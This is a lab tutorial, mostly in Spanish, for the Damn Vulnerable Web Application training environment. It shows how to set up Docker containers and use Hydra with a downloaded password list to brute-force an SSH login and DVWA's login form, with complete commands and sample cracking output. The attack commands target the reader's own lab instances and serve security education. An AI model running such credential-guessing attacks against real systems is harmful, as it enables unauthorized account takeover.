About

Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment

Project Home: https://github.com/digininja/DVWA

PRIMERA PARTE
===============================================================
1

Si usa https://labs.play-with-docker.com/ se recomienda usar




docker login -u username -p password

git clone https://github.com/cesarbobadilla/dvwa.git

cd dvwa  

git checkout BruteForce


2

En la carpeta SSH, usamos el archivo Dockerfile, luego 

docker build -t alpine-ssh SSH/.

docker run --rm --publish=2222:22 alpine-ssh

3

Desde otra instancia podemos probar el acceso 

ssh root@host -p 2222   por ejemplo ( ssh root@192.168.0.6 -p 2222 )

Ponemos el password: computer (que se configuro en el ejemplo, especificamente en el Dockerfile)

4

Ahora en otra instancia, usamos lo que hay en la carpeta HYDRA, usamos el archivo Dockerfile, luego

git clone https://github.com/cesarbobadilla/dvwa.git

cd dvwa  

git checkout BruteForce

docker build -t kali-hydra HYDRA/.

docker run -it kali-hydra /bin/bash


Una vez que estamos en la shell del contenedor, descargamos un diccionario de contraseñas de 10000 posibilidades

curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt > passlist.txt


Y ahora ejecutamos Hydra para que adivine la contraseña configurada, dandole previamente el usuario root y de referencia el diccionario descargado passlist.txt. En el ejemplo consideramos que el ssh esta corriendo en la 192.168.0.6

hydra -s 2222 -l root -P passlist.txt 192.168.0.6 -t 4 -V ssh


Debería seguir ejecutando hasta que vea algo como

...

..

.

[ATTEMPT] target 192.168.0.17 - login "root" - pass "159753" - 55 of 9999 [child 0] (0/0)

[ATTEMPT] target 192.168.0.17 - login "root" - pass "iloveyou1" - 56 of 9999 [child 2] (0/0)

[2222][ssh] host: 192.168.0.17   login: root   password: computer

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-30 15:54:40



Donde concluimos que la contraseña adivinada es "computer"


SEGUNDA PARTE
===============================================================

1

Levantamos otra instancia donde ejecutamos el proyecto de DVWA

git clone https://github.com/cytopia/docker-dvwa.git
cd docker-dvwa/
make start


Una vez concluido esto debemos ver algo como


...

..

.

$ make start


+] Running 4/4

 ✔ Network docker-dvwa_dvwa-net       Created                                                                       0.0s 
 
 ✔ Volume "docker-dvwa_dvwa_db_data"  Created                                                                       0.0s 
 
 ✔ Container docker-dvwa-dvwa_web-1   Started                                                                       0.1s
 
 ✔ Container docker-dvwa-dvwa_db-1    Started                                                                       0.1s
 
docker-compose logs dvwa_web 2>&1 | grep "Setting"

docker-dvwa-dvwa_web-1  | Setting PHP version:        PHP 8.1.16 (cli) (built: Mar  1 2023 12:38:41) (NTS)

docker-dvwa-dvwa_web-1  | Setting MySQL hostname:     dvwa_db

docker-dvwa-dvwa_web-1  | Setting MySQL database:     dvwa

docker-dvwa-dvwa_web-1  | Setting MySQL username:     dvwa

docker-dvwa-dvwa_web-1  | Setting MySQL password:     ********

docker-dvwa-dvwa_web-1  | Setting Recaptcha priv key: 

docker-dvwa-dvwa_web-1  | Setting Recaptcha pub key:  

docker-dvwa-dvwa_web-1  | Setting Security level:     medium

docker-dvwa-dvwa_web-1  | Setting PHP error display:  0

docker-dvwa-dvwa_web-1  | Setting PHP IDS state:      disabled

docker-dvwa-dvwa_web-1  | Setting PHP IDS verbosity:  false



Y el proyecto estará ejecutando en el puerto 8000 (si usa https://labs.play-with-docker.com/, de click en el boton OPEN PORT y digite el numero 8000 ), en login.php, ingresamos con usuario admin y password admin, esto nos llevará a setup.php donde configuramos el proyecto presionando el boton  "Create/Reset Database" al final de la página, y ahora,  al final de la página aparecerá algo como:

 ...
 
 ..
 
 .
 
Database has been created.

'users' table was created.

Data inserted into 'users' table.

'guestbook' table was created.

Data inserted into 'guestbook' table.

Backup file /config/config.inc.php.bak automatically created

Setup successful!

Please login.



Damos click al link de login que estará resaltado en verde, en usuario colocamos admin y en password colocamos password, esto nos llevará a index.php y de ahí, vamos al las opciones finales y elegimos el boton de "DVWA Security" y elegimos el nivel "Low" y damos click al boton Submit (asegurese que en la parte superior diga "Security level is currently: low." y que en la parte inferior de la página diga "Security Level: low"), después vamos al boton de Brute Force y estamos listos para iniciar el ataque con hydra.

En este punto, regresamos a la instancia donde tenemos ejecutando HYDRA (donde anteriormente conseguimos la contraseña de nuestro servicio SSH), estando ahí, ejecutamos el comando:


hydra -l admin -P passlist.txt -s 8000 'http-get-form://192.168.0.18/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=5c679ddf2d5cd92408c8396204f18c51; security=low:F=Username and/or password incorrect' -V

-l de login, el usuario admin, en este ejemplo

-P de filepath, el archivo con nuestro diccionario de contraseñas, en este ejemplo, passlist.txt

-s de port, en el ejemplo 8000

http-get-form://192.168.0.18/vulnerabilities/brute/ define el formulario a donde atacaremos, en el ejemplo, el host esta en la 192.168.0.18

:username=^USER^&password=^PASS^&Login=Login username, password y el boton Login, lo conseguimos del mismo formulario, es el nombre de los campos de entrada en HTML y del boton con nombre Login en el HTML también.

PHPSESSID, es una cookie técnica que permite a los sitios web almacenar un identificador único para cada sesión de usuario, en el ejemplo, conseguimos el dato ingresando a la opcion de herramientas de desarrollador en google chrome, en la opción Application y elegimos donde dice cookie en la parte inferior, y deberiamos ver algo como:


PHPSESSID	5c679ddf2d5cd92408c8396204f18c51	.ip172-18-0-21-crb52n2im2rg00bms5bg-8000.direct.labs.play-with-docker.com	/	2024-09-04T00:31:08.629Z	41	✓					Medium	

__adroll_fpc	a819f74e8d00f47e01dfa033f711aa2b-1725109040798	.play-with-docker.com	/	2025-09-01T08:51:15.000Z	58			Lax			Medium	

_biz_flagsA	%7B%22Version%22%3A1%2C%22ViewThrough%22%3A%221%22%2C%22XDomain%22%3A%221%22%2C%22Mkto%22%3A%221%22%7D	.play-with-docker.com	/	2025-08-31T12:57:18.000Z	113						Medium

...

..

.

Copiamos la parte que nos interesa 5c679ddf2d5cd92408c8396204f18c51 

F=Username and/or password incorrect' es el mensaje que parece cuando ingreso una contraseña incorrecta

Finalmente la opción -V es Verbose, para ver los detalles del proceso


Una vez ingresado el comando anteriormente descrito, si todo va bien, deberiamos ver algo parecido a esto:


[ATTEMPT] target 192.168.0.26 - login "admin" - pass "monkey" - 19 of 9999 [child 6] (0/0)

[ATTEMPT] target 192.168.0.26 - login "admin" - pass "123321" - 20 of 9999 [child 4] (0/0)

[ATTEMPT] target 192.168.0.26 - login "admin" - pass "dragon" - 21 of 9999 [child 1] (0/0)

[ATTEMPT] target 192.168.0.26 - login "admin" - pass "654321" - 22 of 9999 [child 0] (0/0)

[8000][http-get-form] host: 192.168.0.26   login: admin   password: password

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-03 00:50:13


Donde claramento podemos ver que la contraseña es password, vamos a nuestro laboratorio DVWA e ingresamos usuario admin, y en password password y deberiamos ver una imagen que aparece, producto del reto logrado.

Éxitos














 




